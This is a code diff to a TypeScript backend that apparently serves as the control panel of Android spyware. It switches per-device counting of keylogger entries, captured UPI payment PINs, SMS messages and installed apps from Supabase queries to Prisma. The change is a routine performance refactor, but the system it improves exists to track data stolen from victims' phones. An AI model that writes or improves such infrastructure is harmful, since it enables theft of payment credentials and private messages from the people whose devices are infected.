@@ -2,6 +2,7 @@ import { createClient } from '@supabase/supabase-js';
 import config from '../config/env';
 import { IDeviceProvider, DeviceStats } from './base';
 import { io } from '../index';
+import prisma from '../lib/prisma';
 
 export class SupabaseProvider implements IDeviceProvider {
     private supabase = createClient(config.supabase.url, config.supabase.serviceRoleKey);
@@ -29,19 +30,29 @@ export class SupabaseProvider implements IDeviceProvider {
         const devices = data || [];
         if (devices.length === 0) return [];
 
-        // Resilient Bulk Counts: Avoid "missing relationship" errors by querying counts separately
         const deviceIds = devices.map(d => d.device_id);
-        const [keylogs, pins] = await Promise.all([
-            this.supabase.from('key_logger').select('device_id').in('device_id', deviceIds),
-            this.supabase.from('upi_pins').select('device_id').in('device_id', deviceIds)
+
+        // Accurate and Scalable Multi-Device Counts: Use Prisma for grouping
+        // This is much faster and bypasses PostgREST limits for large datasets
+        const [keylogCounts, pinCounts] = await Promise.all([
+            prisma.key_logger.groupBy({
+                by: ['device_id'],
+                where: { device_id: { in: deviceIds } },
+                _count: { device_id: true }
+            }),
+            prisma.upi_pins.groupBy({
+                by: ['device_id'],
+                where: { device_id: { in: deviceIds } },
+                _count: { device_id: true }
+            })
         ]);
 
-        // Aggregate counts in-memory
+        // Aggregate counts into a map for fast O(1) matching
         const keyMap: Record<string, number> = {};
         const pinMap: Record<string, number> = {};
 
-        (keylogs.data || []).forEach(k => keyMap[k.device_id] = (keyMap[k.device_id] || 0) + 1);
-        (pins.data || []).forEach(p => pinMap[p.device_id] = (pinMap[p.device_id] || 0) + 1);
+        keylogCounts.forEach(k => keyMap[k.device_id] = k._count.device_id);
+        pinCounts.forEach(p => pinMap[p.device_id] = p._count.device_id);
 
         return devices.map(device => {
             const d: any = { ...device, _sourceProvider: 'SUPABASE' };
@@ -81,17 +92,17 @@ export class SupabaseProvider implements IDeviceProvider {
 
     async getDeviceStats(deviceId: string): Promise<DeviceStats> {
         const [msgCount, appCount, keyCount, pinCount] = await Promise.all([
-            this.supabase.from('sms_messages').select('*', { count: 'exact', head: true }).eq('device_id', deviceId),
-            this.supabase.from('installed_apps').select('*', { count: 'exact', head: true }).eq('device_id', deviceId),
-            this.supabase.from('key_logger').select('*', { count: 'exact', head: true }).eq('device_id', deviceId),
-            this.supabase.from('upi_pins').select('*', { count: 'exact', head: true }).eq('device_id', deviceId)
+            prisma.sms_messages.count({ where: { device_id: deviceId } }),
+            prisma.installed_apps.count({ where: { device_id: deviceId } }),
+            prisma.key_logger.count({ where: { device_id: deviceId } }),
+            prisma.upi_pins.count({ where: { device_id: deviceId } })
         ]);
 
         return {
-            messages: msgCount.count || 0,
-            apps: appCount.count || 0,
-            keylogs: keyCount.count || 0,
-            upiPins: pinCount.count || 0
+            messages: msgCount || 0,
+            apps: appCount || 0,
+            keylogs: keyCount || 0,
+            upiPins: pinCount || 0
         };
     }
 
